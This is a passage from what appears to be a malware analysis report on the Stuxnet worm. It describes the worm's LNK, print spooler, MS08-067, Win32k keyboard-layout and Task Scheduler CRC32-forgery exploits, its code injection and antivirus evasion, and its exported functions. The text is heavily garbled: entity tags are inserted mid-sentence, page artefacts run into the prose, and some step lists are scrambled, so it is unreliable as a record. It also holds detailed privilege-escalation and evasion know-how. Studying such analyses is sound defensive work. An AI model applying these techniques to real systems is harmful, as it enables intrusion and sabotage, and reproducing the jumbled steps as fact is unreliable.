is hidden in the File Location Info field , which specifies the path from which the [ORG] CPL file should be loaded . A vulnerability was found in [FAC] Windows [FAC] Shell which could allow code execution if the icon of a specially crafted shortcut is merely displayed . Here is a malicious .LNK file from an infected [ORG] USB flash drive : Figure [CARDINAL] 3.4 \u2013 Malware .LNK File from an Infected USB Flash [ORG] DriveIn [ORG] the [ORG] File [ORG] Location [ORG] Info field there is a path to the file that contains the payload that should be executed . In this case , the path points to an external drive , and when this is viewed in Windows Explorer it causes the system to execute ~wtr4141.tmp . More information on the distribution using external [ORG] USB and media devices can be read in the section devoted to precisely this functionality . In all the analyzed malicious .LNK files we have seen , there is a feature that consists of [CARDINAL] two GUID sequences . These sequences indicate the following : Figure [CARDINAL] 3.5 \u2013 GUID from .LNK FilesThe .LNK file most likely points to and loads a [ORG] CPL file . When the directory containing the crafted .LNK exploit is opened with Windows Explorer , the following chain of function calls will eventually lead to a function call LoadLibraryW ( ) . When the function LoadLibraryW ( ) is called , the malware [ORG] DLL will be executed.www.eset.com27Figure [CARDINAL] 3.6 \u2013 A Chain of CallsIf we trace this chain of calls in the debugger , we see confirmation of all the facts described above . Thus we can execute any malicious module , as LoadLibraryW ( ) receives as a parameter the path to the module , which it must perform and no additional inspections are not happening . Figure [CARDINAL] 3.7 \u2013 Loading Malicious ModuleThis vulnerability highlights the fact that like many other bugs , this error has found its way into the architecture of fundamental mechanisms , in this case for processing [ORG] LNK files . Vulnerabilities which , as in this case , are symptomatic of fundamental design flaws are a nightmare for developers of any program , because they are always difficult and time - consuming to fix.3.1.1 Propagation via External Storage DevicesSince the vulnerability is based on the mechanism for the display .LNK files , it is possible to distribute malware via removable media and [ORG] USB drives without using Autorun - related infection . This propagation vector was used in the Stuxnet attack.3.1.2 Metasploit and WebDAV Exploitincludingimplementation of [DATE] the [DATE] exploitA [DATE] few [DATE] days after the public debate concerning .LNK [DATE] PoC exploitation , [ORG] the [ORG] Metasploit [ORG] Framework released code in order to allow remote attacks ( url Prior to the release of this exploit , it was believed that this vulnerability is not exploitable for remote attacks . Researchers from [ORG] the [ORG] Metasploit [ORG] Project showed that this was not the case , by using the [ORG] UNC path to the [WORK_OF_ART] WebDAV service ( url This vulnerability is still functional . This exploit used a WebDAV service that can be used to execute an arbitrary payload when accessed as a [ORG] UNC path by following the link generated by [GPE] Metasploit that displays the directory containing .LNK file and [ORG] DLL module with payload.www.eset.com28Figure [CARDINAL] 3.8 \u2013 WebDAV Directory Generated by [ORG] MetasploitThe [ORG] .LNK file contains the network path to the module with the payload . Figure [CARDINAL] 3.9 \u2013 .LNK File Generated by [ORG] MetasploitThe vulnerability in .LNK files and the recently discovered [ORG] DLL [ORG] Hijacking vulnerability ( url have much in common , both in the nature of their appearance , and in the ways in which they \u2019ve been exploited.3.1.3 What Do DLL Hijacking Flaws and [ORG] the [ORG] LNK [ORG] Exploit have in [PERSON] Common?While we have been writing this report public information was released about [ORG] DLL [ORG] Hijacking flaws ( [ORG] Microsoft [ORG] Security [ORG] Advisory [DATE] 2269637 ) and we noted some association with or resemblance to the .LNK files vulnerability . Both vulnerabilities are inherent design flaws and in both cases the function LoadLibrary ( ) is used . The directory where the exploitative file is found can be situated in a [ORG] USB drive , an extracted archive , or a remote network share . In both cases we find spoofed paths to a loadable module and the possibility of a remote attack via the WebDAV service . What other vulnerabilities are stored in Windows operating systems , nobody knows . Most likely , this vector of attack will undergo a thorough research and it might be that something else equally interesting is awaiting us in the near future.www.eset.com3.2 [ORG] LNK [ORG] Vulnerability in [GPE] Stuxnet29This is the [ORDINAL] first way in which the rootkit distributes itself . When you inspect a flash [ORG] USB drive infected with the Stuxnet worm you can expect to find [CARDINAL] 6 files there as on the following screenshot : Figure [CARDINAL] 3.10 \u2013 [ORG] The Worm \u2019s Files on a [ORG] USB Flash DriveCopy of [PERSON] Shortcut [PERSON] to.lnk ; Copy of Copy of Shortcut to.lnk ; Copy of Copy of Copy of Shortcut to.lnk ; Copy of Copy of Copy of Copy of Shortcut to.lnk ; [ORG] ~WTR4141.TMP ; ~WTR4132.TMP.The [ORDINAL] first [CARDINAL] four files are [ORG] LNK files \u2013 these are the files that specify how the [ORG] Icon of other files should be displayed . The files with [ORG] LNK extension are different : here is an example of the contents of [CARDINAL] one of them : Figure [CARDINAL] 3.11 \u2013 Contents of the .LNK FilesThe worm exploits the CVE-2010 - 2568 vulnerability ( see section The [ORG] LNK exploit for details ) to infect the system . You can see in the figure above the highlighted name of the module to be loaded during the exploitation of the vulnerability . When a user tries to open an infected [ORG] USB flash drive with an application that can display icons for shortcuts , the file with the name [ORG] ~WTR4141.TMP is loaded and its entry point is called . The file is , in fact , a dynamic link library , the main purpose of which is to load another file with the name ~WTR4132.TMP from the infected flash drive.www.eset.com30The files with the .LNK filename extension are essentially the same except they specify different paths to the single file:\\\\.\\STORAGE#Volume#_??_USBSTOR#Disk&Ven_____USB&Prod_FLASH_DRIVE&Rev_#1\\\\.\\STORAGE#Volume#1&19f7e59c&0&_??_USBSTOR#Disk&Ven_____USB&Prod_FLASH2345000100000000173&0#{53f56307 - b6bf-11d0 - 94f2 - 00a0c91efb8b}#{53f5630d - b6bf-11d0- 94f2 - 00a0c91efb8b}\\~WTR4141.tmp ; _ DRIVE&Rev_#12345000100000000173&0#{53f56307 - b6bf-11d0 - 94f2- 00a0c91efb8b}#{53f5630d - b6bf-11d0 - 94f2 - 00a0c91efb8b}\\~WTR4141.tmp ; [CARDINAL] 00a0c91efb8b}\\~WTR4141.tmp ; 00a0c91efb8b}\\~WTR4141.tmp.\\\\.\\STORAGE#RemovableMedia#8&1c5235dc&0&RM#{53f5630d - b6bf-11d0 - 94f2-\\\\.\\STORAGE#RemovableMedia#7&1c5235dc&0&RM#{53f5630d - b6bf-11d0 - 94f2 - All these strings specify a path to the file located on the removable drive , and are used instead of a short form of the path with a drive letter . The [ORDINAL] first part of the path to the file ( before the backslash \" \\ \" that precedes the filename ) is a symbolic link name referring to the corresponding volume , as we can see on the figure below : Figure [CARDINAL] 3.12 \u2013 Symbolic Link Names of [ORG] VolumesThe [ORDINAL] first entry in figure [CARDINAL] 3.12 corresponds to the volume representing a [ORG] USB flash drive , the name of which is \\Device\\HarddiskVolume5 . Notably , that drive letters are symbolic link names too that refer to the same device objects : Figure [CARDINAL] 3.13 \u2013 Drive lettersStuxnet uses the long versions of pathnames because it is impossible to predict what letter corresponds to a removable drive in a remote system , and as a result , the short paths are likely to be incorrect in some cases . The longer variant of a path is constructed with respect to certain rules and configuration information obtained from the hardware , so that we can predict with considerable accuracy what symbolic link name corresponds to a device on a remote machine . The rules according to which these symbolic links are constructed vary depending on the operating system , which is why Stuxnet uses [CARDINAL] four distinct .LNK files . For instance , the [ORDINAL] first entry in the list presented above wo n't work on Windows XP but will work on [EVENT] Windows [EVENT] 7 , the [ORDINAL] second entry works on [PERSON] Windows [PERSON] Vista , while the last [CARDINAL] two entries work on Windows XP , Windows Server [DATE] 2003 and Windows 2000.www.eset.com3.3 The MS10 - 061 [PRODUCT] Attack Vector31Another way in which the worm replicates itself over the network exploits a vulnerability in [PERSON] Window [PERSON] Spooler ( MS10 - 061 ) . Machines with file and printer sharing turned on are vulnerable to the attack . This vulnerability results in privilege escalation allowing a remote user using a [ORG] Guest account to write into % SYSTEM% directory of the target machine . The attack is performed in [CARDINAL] two stages : during the [ORDINAL] first stage the worm copies the dropper and additional file into [GPE] Windows\\System32\\winsta.exe and [ORG] Windows\\System32\\wbem\\mof\\sysnullevnt.mof respectively , while at the [ORDINAL] second stage the dropper is executed . The [ORDINAL] first stage exploits the MS10 - 061 vulnerability . Under certain conditions the spooler improperly impersonates a client that sends [CARDINAL] two \u201c documents \u201d for printing as we can see on the figure below . Figure [CARDINAL] 3.14 \u2013 \" Printing \" Malicious [PERSON] Files into [GPE] Files in % SYSTEM% DirectoryThese documents are \u201c printed \u201d to files in the % SYSTEM% directory while a user has Guest privileges that should n\u2019t entail access rights to the % SYSTEM% directory . During exploitation of the vulnerability , a thread of the process spoolsv.exe calls an API function StartDocPrinter ( ) with parameter specifying the following information about document to be printed : typedef struct _ DOC_INFO_1 { LPTSTR pDocName;LPTSTR pOutputFile;LPTSTR [ORG] pDatatype ; } DOC_INFO_1;// Default// winsta.exe or wbem\\mof\\sysnullevnt.mof// RAWIn [DATE] the [DATE] middle [DATE] of [DATE] September [DATE] 2010 , [ORG] Microsoft released a security patch to fix MS10 - 061 . We have compared the original executable spoolsv.exe with the patched executable and found some functional differences . [CARDINAL] One of the most important differences concerns the YStartDocPrinter function which is eventually called in order to print a document . On the figure below we provide a graphical representation of the functions.www.eset.com32Figure [CARDINAL] 3.15 \u2013 Functional Changes in the Patched VersionThe left - hand side represents the patched function while on the right - hand the original is displayed . The functions are in general the same , but some additional checks have been added , and these are highlighted in red . Before printing a document the function performs the following checks : whether the caller belongs to Local group ; whether OutputFile parameter is [ORG] NULL or equal to a port name of the printer : otherwisea client needs to have appropriate access rights to write to the specified file . The sequence of check is presented on the figure below.www.eset.com33Figure [CARDINAL] 3.16 \u2013 Additional Checks Implemented by MicrosoftThe [ORDINAL] second stage of the attack employs the file wbem\\mof\\sysnullevnt.mof : that is , a [ORG] Managed [ORG] Object [ORG] Format file . Files of this type are used to create or register providers , events , and event categories for [ORG] WMI . Under certain conditions this file runs winsta.exe ( the dropper ) and its execution by the system results in the infection of [ORG] the [ORG] system.www.eset.com3.4 [ORG] Network [ORG] Shared [ORG] Folders And [ORG] RPC [ORG] Vulnerability ( MS08 - 067)34The worm is also capable of distributing itself over the network through shared folders . It scans network shares c$ and admin$ on the remote computers and installs a file ( dropper ) there with the name DEFRAG < GetTickCount>.TMP , and schedules a task to be executed on [DATE] the [DATE] next [DATE] day : rundll.exe \" [PERSON] C:\\addins\\DEFRAGdc2d0.TMP \" , DllGetClassObjectFigure 3.17 \u2013 Stuxnet Schedules Dropper Execution on the Next DayStuxnet \u2019s exploitation of the [CARDINAL] MS08 - 67 vulnerability to propagate itself through the network is comparable to the use of the same vulnerability by the network worm [ORG] Conficker . Its exploit is implemented as a separate module . We have compared the [CARDINAL] two exploit implementations in [ORG] Conficker and Stuxnet and found that the shell codes that have been used are different . Stuxnet 's shell code is rather sophisticated and employs advanced techniques that have recently become widely spread such as [ORG] ROP ( return oriented programming).www.eset.com3.5 [DATE] 0 - [DATE] day in Win32k.sys ( MS10 - 073)35When the Win32 / Stuxnet worm did n\u2019t have enough privileges to install itself in the system it exploited a recently patched ( MS10 - 73 ) [DATE] 0 - [DATE] day vulnerability in the win32k.sys system module to escalate privilege level up to SYSTEM , which enabled it to perform any tasks it likes on the local machine . The vulnerable systems are : [ORG] Microsoft Windows 2000 ; [ORG] Unpatched [ORG] Windows [ORG] XP ( all service packs).Actually , in theory , it is possible to exploit this vulnerability on the other systems as the code pertaining to the vulnerability exists ( see figure [CARDINAL] 3.17 ) , but there are no known ways to reach it ( i. e. the code that transfers control to the shell code ) and as a result the shell code wo n't be executed . To perform this trick , Stuxnet loads a specially crafted keyboard layout file , making it possible to execute arbitrary code with SYSTEM privileges . The escalation of privileges occurs while dispatching input from the keyboard input from the keyboard using the [ORG] NtUserSendInput system service , the following code is executed : in Win32k.sys module . While processingFigure [CARDINAL] 3.18 \u2013 A fragment of the executed code during processing keyboard inputThe purpose of this code is to determine how to dispatch virtual key code of the pressed button . Register ecx specifies the type of the handler according to the current keyboard layout to be called in _ aNLSVKProc procedure table . This table consists of [CARDINAL] three handlers : Figure [CARDINAL] 3.19 \u2013 _ aNLSVKProc procedure tableAs we can see from the figure above ( [CARDINAL] 3.18 ) , the _ aNLSVKProc is followed by [CARDINAL] 3 DWORDs , the last of which ( highlighted in red ) can be interpreted as a pointer pointing to [CARDINAL] 0x60636261 in the user - mode address space . Thus , if we set the ecx register in the code in figure [CARDINAL] 1 with the proper value , namely [DATE] 5 , then we can execute code at [FAC] 0x6036261 with SYSTEM privileges . We can manipulate the ecx register in this code by loading a specially crafted keyboard layout file specifying that certain virtual key codes should call the procedure indexed as [CARDINAL] 5 . The keyboard layout file is a dynamic link library of which the .data section is specially structured . Below we present a structure that maps virtual keys to corresponding procedures in the table.www.eset.comtypedef struct _ VK_TO_FUNCTION_TABLE { [CARDINAL] 36BYTE Vk;BYTE NLSFEProcType;// [GPE] Virtual - key code// Index of the procedure in _ aNLSVKProc table // corresponding to the virtual [PERSON] keyBYTE [PERSON] NLSFEProcCurrent;BYTE [PERSON] NLSFEProcSwitch;VK_FPARAM NLSFEProc[8];VK_FPARAM NLSFEProcAlt[8 ] ; } VK_F , * KBD_LONG_POINTER PVK_F;The worm loads a special keyboard layout file by calling NtUserLoadKeyboardLayoutEx and passing it the following hexadecimal constant 0x01AE0160 as an offTable parameter . The low word of this parameter specifies the [ORG] RVA ( Relative Virtual Address ) of the KBDTABLES structure from the beginning of the file , while the high word specifies the [ORG] RVA of [ORG] KBDNLSTABLES , which is of particular interest . The latter structure determines the address and size of the array of VK_F structures contained in the file.typedef struct tagKbdNlsLayer { [ORG] USHORT OEMIdentifier;USHORT LayoutInformation;UINT NumOfVkToF;PVK_F pVkToF;INTNumOfMouseVKey;// [PERSON] Size of array of VK_F structures// RVA of array of VK_F structures in the // keyboard layout fileUSHORT * KBD_LONG_POINTER pusMouseVKey ; } KBDNLSTABLES , * KBD_LONG_POINTER PKBDNLSTABLES;In figure [CARDINAL] 3.19 below we present the contents of the .data section where we can see that the structure [ORG] KBDNLSTABLES located at RVA 0x1AE specifies one structure VK_F located at RVA 0x01C2.Figure [CARDINAL] 3.20 \u2013 .data section of the crafted keyboard layout fileAs we can see , the keyboard layout file contains exactly one VK_F structure that maps a virtual - key with code equal to procedure [CARDINAL] 0 in _ aNLSVKProc with indexed as [CARDINAL] 5.www.eset.com37One thing we need to do in order to exploit this vulnerability is to allocate a buffer for the code to be executed at address [CARDINAL] 0x60636261 as in the case with Stuxnet , which allocates [CARDINAL] 32 [PERSON] KB of memory at [GPE] 0x60630000 ( figure [CARDINAL] 3.20 ) and writes shell code at [CARDINAL] 0x60636261 ( figure [CARDINAL] 3.21):Figure [CARDINAL] 3.21 \u2013 Stuxnet allocates [CARDINAL] 32 [PERSON] KB of memory at 0x60630000 for shell codeFigure [CARDINAL] 3.22 \u2013 The beginning of the shell code at [CARDINAL] 0x60636261Microsoft 's patchOn [DATE] the [DATE] 13th [DATE] of [DATE] October [DATE] 2010 [ORG] Microsoft released a security patch that fixes this vulnerability . We 've compared unpatched and patched Win32k.sys modules to understand the way the vulnerability was fixed . As we expected MS added an additional check in the code handling keyboard input ( namely in the function xxxEKNLSProcs ) to prevent NLSFEProcType field of the VK_F structure of being out of the boundaries _ aNLSVKProc table . In the figures below we can see unpatched ( figure [CARDINAL] 3.22 ) and patched code ( figure [CARDINAL] 3.23 ) respectively where the additional check is highlighted with the red border . As we can see , before calling a procedure from _ aNLSVKProc table the check is performed to ensure that the index of the procedure does n't exceed the value of [CARDINAL] 2 ( correct values are 0,1,2).www.eset.com38Figure [CARDINAL] 3.23 \u2013 A part of the [ORG] xxxEKNLSProcs procedure before patchingwww.eset.com39Figure 3.24 \u2013 A part of the [ORG] xxxEKNLSProcs procedure after patchingwww.eset.com3.6 MS10 - 092 : Exploiting a [DATE] 0 - [DATE] day in Task Scheduler40Yet another vulnerability that Stuxnet exploits in order to elevate privileges concerns [ORG] the [ORG] Task [ORG] Scheduler [ORG] Service implemented in Windows operating systems starting from [ORG] Windows [ORG] Vista . Remarkably enough , [CARDINAL] 64 - bit version of the operating systems are vulnerable as well as x86 versions . Exploiation of the vulnerability allows Stuxnet to elevate its privileges up to SYSTEM level . There vulnerability represented a serious flaw in the original design of the service : namely in the way it controlled integrity of the metadata describing scheduled jobs . In operating systems after [PERSON] Windows [PERSON] Vista , [PERSON] Task [PERSON] Scheduler creates an xml file with configuration information for each registered job . These files are usually located in the % SystemRoot%\\system32\\Tasks folder ( if not otherwise specified ) and contain such information as type of the job , path to the executable and command line arguments , account that the executable will be run under , required privileges and so on . Figure [CARDINAL] 3.25 \u2013 A part of the configuration file describing a jobIn the figure above you can see part of the configuration xml file for a task . The Principals section in the file defines required privileges for the job , while the Actions section defines what the job should do ( to get the full list of possible job actions we refer the reader to [ORG] MSDN ) . In particular case as described in figure [CARDINAL] 3.25 the job will run the notepad application with no command line arguments , using the [ORG] LocalSystem account with the highest available privileges . Although [PRODUCT] the [PRODUCT] Task [PRODUCT] Scheduler directory can be read only by [ORG] LocalSystem and members of the local administrators group , the file describing the task scheduled by a user is fully accessible to him as long as he is n\u2019t a [ORG] Guest ( as can be seen on the following figure [CARDINAL] 3.26 ) . To protect the integrity of the job configuration files and prevent users from modifying them ( for instance to elevate privileges by overwriting the Principals section ) , [PRODUCT] Task [PRODUCT] Scheduler calculates a checksum on creating a task . When it is time to start the job , [PRODUCT] Task [PRODUCT] Scheduler recalculates it and compares the new check sum to the original value : if they match the job is run . The flaw in the aforementioned scenario is that [PRODUCT] Task [PRODUCT] Scheduler calculates the checksum with the CRC32 algorithm ( you can find a description of the algorithm in Appendix D ) . This is known to be good for detecting unintentional errors ( mainly due to transmitting data through communication channels ) but not intentional as in the case . It is known also that the CRC32 algorithm has linear properties that make it very easy to create another message with the same checksum as the specified message.www.eset.com41Figure [CARDINAL] 3.26 \u2013 Access permissions to the [PRODUCT] Task folder and a task fileThis is exactly what Stuxnet does in order to elevate its privileges in unpatched [ORG] Vista and later operating systems . Here is a brief summary of the algorithm that Stuxnet uses to exploit the vulnerability : Create a job that will be run under the current user account with the least available1 . its CRC32 checksum ; [CARDINAL] 3 . matches the same check sum as the original file and set the following properties : Read the task configuration file corresponding to the task created at step [CARDINAL] 1 and calculateModify the task configuration file corresponding to the task created at step [CARDINAL] 1 so that itId = LocalSystem(principal for the task that provides securitya . Principal credentials ) ; b. UserId = S-1 - 5 - 18 ( [ORG] SID of the LocalSystem ) ; c. [ORG] RunLevel = [ORG] HighestAvailable ( run with the highest available privileges ) ; d. Actions Context = [PERSON] LocalSystem ( security context under which the actions of the task are performed);4 . Run the task . To ensure that the modified file has the same check sum value as the original , it appends a special comment of the form < ! --XY-- > to the end of the file and calculates [ORG] XY ( the algorithm for calculating thiswww.eset.com42value is presented in Appendex E ) such that it has the specified CRC32 check sum value . The result of such manipulations is as shown in figure [CARDINAL] 3.27 : Figure [CARDINAL] 3.27 \u2013 Forged task configuration fileAs a result [PRODUCT] Task [PRODUCT] Scheduler will start the task normally with the specified privileges . [ORG] Microsoft 's patchOn [DATE] the [DATE] 14th [DATE] of [DATE] December [DATE] 2010 [ORG] Microsoft released a security update ( MS10 - 092 ) to fix the vulnerability in [FAC] Windows [FAC] Task [FAC] Scheduler service which allows elevation of privilege , as described above . To protect the integrity of the xml schema describing a task , the service already used the crc-32 algorithm . Thus , given a task xml schema , it is possible to create another schema with the same checksum . To fix the vulnerability [ORG] Microsoft implemented an additional SHA-256 cryptographic hash algorithm to check the integrity of a task xml schema . If we look into the updated [ORG] schedsvc.dll library which implements the service , we can find a type HashCompute which is not present in the unpatched library : Figure [CARDINAL] 3.28 - Available methods of the HashCompute typeThe type was implemented to provide integrity checking for the xml schemas that define tasks . Here are cross - references to the HashCompute::ComputeHash method which tell us when the hash value is calculated and when it is checked : Figure [CARDINAL] 3.29 - Cross - references to HashCompute::ComputeHash methodIf we look at the implementation of the HashCompute::ComputeHash method , the following code can be found , which calculates hash value of the xml schema : www.eset.com43Figure [CARDINAL] 3.30 - Opening handle to [ORG] Microsoft [ORG] Enhanced [ORG] RDA and [ORG] EAS [ORG] Cryptographic ProviderFigure 3.31 - Computing SHA-256 of xml schemaThe SHA-256 hash function is known to be secure against finding the [ORDINAL] second pre - image and collisions , unlike the crc-32 checksum algorithm . Thus given an xml schema that define a task it is impossible in polynomial ( real ) time to construct another xml schema with the same hash value . This means that it is no longer possible to exploit the vulnerability on a patched system in the way that Win32 / Stuxnet attempts . MS10 - 092 in Win32 / OlmarikA new modification of the notorious rootkit Win32 / Olmarik . AIY , also known as TDL4 ( you can read \" TDL3 : [WORK_OF_ART] The [WORK_OF_ART] Rootkit [WORK_OF_ART] of [WORK_OF_ART] All [WORK_OF_ART] Evil ? \" report for detailed information about previous version of the rootkit ) appeared in [DATE] the [DATE] end [DATE] of [DATE] November which is capable of elevating privileges on [ORG] Microsoft [PRODUCT] Windows operating systems starting from [ORG] Windows [ORG] Vista by means of exploiting the MS10 - 092 vulnerability . [ORG] TDL4 's implementation of the code that exploits the vulnerability does n't essentially differ from that of Stuxnet 's code . The rootkit creates a legitimate task by means of the available interface in the system , then reads the xml schema corresponding to the task directly from the file in the [PRODUCT] Task [PRODUCT] Scheduler folder , and then modifies it : [PERSON] Fig . [CARDINAL] 3.32 : Modification of xml [NORP] SchemaIt sets certain attributes with the following values : www.eset.com44Principal Id = [PERSON] LocalSystem ; UserId = S-1 - 5 - 18 ; [ORG] RunLevel = [ORG] HighestAvailable ; Actions Context = [CARDINAL] LocalSystem;As a result the rootkit creates an xml schema defining a task that will be run under the [ORG] LocalSystem account . Below you can see a part of the schema : www.eset.com454Stuxnet ImplementationThis chapter covers the implementation aspects of the worm : namely , its user - mode and kernel - mode components . A full set of the modules it incorporates can be found in table [CARDINAL] 4.1.2 . The [ORDINAL] first part of the section describes Stuxnet \u2019s user - mode functionality and starts with an overview of the main module . Furthermore , we present information on how Stuxnet injects code into processes in the system , and on its installation algorithm . We also describe the set of functions exported by the main module , and the [ORG] RPC server used for P2P communication . The [ORDINAL] second part of this section concerns the kernel - mode drivers that Stuxnet uses to hide its dropper and malicious .LNK files , and inject code into processes so as to survive after reboot . We also present some information on Stuxnet configuration data and its remote communication protocol with [ORG] C&C servers.4.1 [ORG] User - mode functionalityThere are several modules that constitute the user - mode functionality . The main module that contains the others is a large dynamic link library . Other modules including kernel mode drivers are stored in the [ORG] DLL \u2019s resources.4.1.1 Overview of the main moduleThe main module is represented as a large [ORG] DLL packed with UPX . Its unpacked size is [DATE] 1233920 bytes ( [CARDINAL] 1.18 MB).Figure [CARDINAL] 4.1 \u2013 Section Table of the [ORG] Main Modulewww.eset.com46Figure 4.2 \u2013 Resources of the [ORG] Main [ORG] ModuleThe main module exports [CARDINAL] 21 functions by ordinal . Each function has its own purpose as will be described in the section Exported functions . Figure [CARDINAL] 4.3 \u2013 Export Address Table of the Main Module4.1.2Injecting codeThe malware employs quite an interesting technique to inject code into the address space of a process and execute exported functions . The user - mode modules of Stuxnet are implemented as dynamic link libraries , and exported functions are frequently executed or injected into the address space of a process . There are [CARDINAL] two different cases : when a module is loaded into an existing process , or when the module is injected into a new process.www.eset.comInjecting into a current process4.1.347Consider the [ORDINAL] first case , when [CARDINAL] one of the user - mode components wants to call a function exported by another component in the context of the calling process . To avoid being detected by antivirus software the malware loads a module in the following way:1 . [CARDINAL] 2.It allocates a memory buffer in the calling process for the module to be loaded ; It patches [CARDINAL] Ntdll.dll system library : namely , it hooks the following functions : It calls LoadLibraryW API , exported from kerenl32.dll and passing it as a parameter a library name , using the pattern : [PERSON] KERNEL32.DLL.ASLR.XXXXXXXX orZwMapViewOfSection ; SHELL32.DLL.ASLR.XXXXXXXX , where [ORG] XXXXXXXX is a random hexadecimal number ; [CARDINAL] 4 . 5.It calls desired exported function ; It calls FreeLibrary API function to free loaded library . To hook the functions specified above , the malware allocates a memory buffer for code that will dispatch calls to hooked functions , overwrite some data in [ORG] MZ header of the image with the code that transfers control to the new functions , and hook the original functions by overwriting its bodies , the result of these manipulations is presented on figure [CARDINAL] 4.4.www.eset.com48Figure 4.4 \u2013 Hooking Functions in ntdll.dllwww.eset.comThe [ORG] MZ header of ntdll.dll is overwritten with the following code:49Figure 4.5 \u2013 Code Injected into [PERSON] MZ [PERSON] Header of ntdll.dllThe purpose of all these manipulations is to load a non - existent library legitimately ( at least as far as the system is concerned ) . The hook functions allow the malware to load module as if it were a library that really existed . When a library with specific name ( [PERSON] KERNEL32.DLL.ASLR or SHELL32.DLL.ASLR ) is requested , these functions map the desired module into the address space of the process . As a result , the loaded module looks like a real dynamic link library except that there is no file with the name of the library on the hard drive , which reduces probability of detection by heuristic methods . Some anti - rootkit software does detect it and warn users : www.eset.com50Figure [CARDINAL] 4.6 \u2013 GMER Detected that Loaded Library does n't have [PERSON] Corresponding File4.1.4Injecting into a new processIn the [ORDINAL] second case when the malware requires the module to be executed in a newly created process it uses different approach . To achieve this Stuxnet : Creates a host process ; Replaces the image of the process with the module to execute and with supplemental code that will load the module and call specified export passing parameters ( as in the [ORDINAL] first case described).Depending on the processes present in the system the malware chooses the host process fromthe following list : lssas.exe ( system process ) ; avp.exe ( [PERSON] Kaspersky ) ; mcshield.exe ( McAfee VirusScan ) ; avguard.exe ( [ORG] AntiVir [ORG] Personal [ORG] Edition ) ; bdagent.exe ( [ORG] BitDefender [ORG] Switch [ORG] Agent ) ; UmxCfg.exe ( eTrust Configuration Engine from [ORG] Computer [ORG] Associates [ORG] International ) ; fsdfwd.exe ( F - Secure Anti - Virus suite ) ; rtvscan.exe ( Symantec Real Time Virus [NORP] Scan service ) ; ccSvcHst.exe ( [ORG] Symantec [ORG] Service [ORG] Framework ) ; ekrn.exe ( ESET Antivirus Service Process ) ; tmproxy.exe ( PC - cillin antivirus software from TrendMicro);The malware enumerates processes in the system and if it finds a process whose executable image has a name present in this list , and which meets certain criteria , then it is chosen to be a host for the module.4.1.5InstallationWe can consider the case when ~WTR4141 . [ORG] TMP is loaded due to the vulnerability ( CVE-2010 - 2568 ) in displaying shortcuts for icons as described in [PRODUCT] section [PRODUCT] 1.6 . As soon as the file is loaded it hooks the following functions to hide the worm 's files on a flash [ORG] USB drive.www.eset.com51In kernel32.dll :o FindFirstFileW ; o [DATE] FindNextFileW ; o [ORG] FindFirstFileExW;In ntdll.dll :o NtQueryDirectoryFile ; o ZwQueryDirectoryFile . This function filters the files that satisfy the following criteria from being displayed : files with \" .LNK \" extension of which the file size is equal to [DATE] 1471 ( 0x104b ) bytes ; files with \" .TMP \" extension of which the name consists of [CARDINAL] 12 characters ( including filename extension ) in the following format : \" ~WTRabcd . [ORG] TMP \" , where a , b , c , d are digits from [CARDINAL] 0 [CARDINAL] to [CARDINAL] 9 which sum modulo [CARDINAL] 10 equals [CARDINAL] 0 ( \" [WORK_OF_ART] ~WTR4411.TMP \" for example).This module loads another module . ~WTR4132.TMP , using a method described in previous section . ~WTR4132.TMP extracts from its section with \" .stub \" name another component \u2013 the main dynamic link library of Stuxnet - then loads it and calls exported function number 15.Figure [CARDINAL] 4.7 \u2013 Installation of the MalwareThis function checks whether the token of the current user belongs to the group of the local administrators on the computer : if so , it executes the exported function with ordinal [CARDINAL] 0x10 in a new process . This function installs Stuxnet 's components onto the system.www.eset.com4.1.6 Exported functions52Here we will describe the functions exported by the main module . Export 1This function has the same functionality as the function number [CARDINAL] 32 except it waits for [TIME] 60 [TIME] seconds prior creating and starting Stuxnet 's [ORG] RPC [ORG] Server . Export 2This function is called in address space of the process with name s7tgtopx.exe and CCProjectMgr.exe and hooks certain functions by modifying the import address table of the corresponding modules . The table below gives the names of the patched modules and hooked functions : Table 4.1.1 \u2013 Patched Modules and [ORG] Hooked [ORG] FunctionsPatched moduleHooked functions7apromx.dllmfc42.dllmsvcrt.dllCreateFileACreateFileACreateFileACCProjectMgr.exeStgOpenStorageLibrary exporting hookedfunctionkernel32.dllkernel32.dllkernel32.dllole32.dllThe hook for CreateFileA monitors opening files with the extension .S7P while the hook for StgOpenStorage monitors files with extension .MCP.Export [CARDINAL] 4This function performs the full cleanup of the malware from the system . It starts a new process , injects the main module into it and calls exported function [CARDINAL] 18 ( see [CARDINAL] 18).Export 5This function checks whether the kernel - mode driver [ORG] MrxCls.sys is properly installed in the system . Export [CARDINAL] 6This function returns current version of Stuxnet installed in the system . Export 7The same as function number [CARDINAL] 6www.eset.comExport 953This function builds Stuxnet 's dropper from the files located in the system and runs it . The dropper is constructed from the following files which seems to be a components of Stuxnet:%Dir%\\XUTILS\\listen\\XR000000.MDX ; % Dir%\\XUTILS\\links\\S7P00001.DBF ; % Dir%\\XUTILS\\listen\\S7000001.MDX.%Dir% passed as a parameter by a caller of the function . Export [CARDINAL] 10This function performs the same actions as function number [CARDINAL] 9 which builds and runs the Stuxnet dropper . The only difference between these functions is that this function can build the dropper from the set of the files used in function number [CARDINAL] 9 as well as from the following files:%Dir%\\GracS\\cc_alg.sav ; [GPE] % Dir%\\GracS\\\\db_log.sav ; % Dir%\\GracS\\\\cc_tag.sav . Parameter % Dir% is also specified by a caller . Export 14This function manipulates with files which paths it receives as a parameter . Export 15This routine initiates infection of the system . See section [CARDINAL] 4.1.5 for more details . Export [CARDINAL] 16This function installs the malware 's components in the system and performs the following tasks : Drops and installs kernel - mode drivers : MrxNet.sys and [ORG] MrxCls.sys ; Drops the main dll in % SystemRoot%\\inf\\oem7A.PNF ; Drops Stuxnet 's configuration data in [PERSON] % SystemRoot%\\inf\\mdmcpq3.PNF ; [PERSON] Creates tracing file in % SystemRoot%\\inf\\oem6C.PNF ; Drops data file in % SystemRoot%\\inf\\mdmeric3.PNF ; Injects the main dll into services.exe process and executes the function exported asordinal [CARDINAL] 32 ; function [CARDINAL] 2 there . Injects the main dll into the s7tgtopx.exe process if any exists , and executes exportedExport [CARDINAL] 17This function replaces s7otbxdx.dll with a malicious [ORG] DLL . It moves the original library into a file called s7otbxdsx.dll . The malicious library is a wrapper for the original [ORG] DLL : that is , it simply passes control to the original library , except in the case of certain functions which it hooks : s7_event ; s7ag_bub_cycl_read_create;www.eset.com54s7ag_bub_read_var ; s7ag_bub_write_var_seg;Export [CARDINAL] 18This function completely removes the malware from the system . It performs the following operations:1 . [CARDINAL] 10.Restores forged dynamic link library ( s7otbxdx.dll ) for [ORG] Siemens software ; [ORG] Notifies 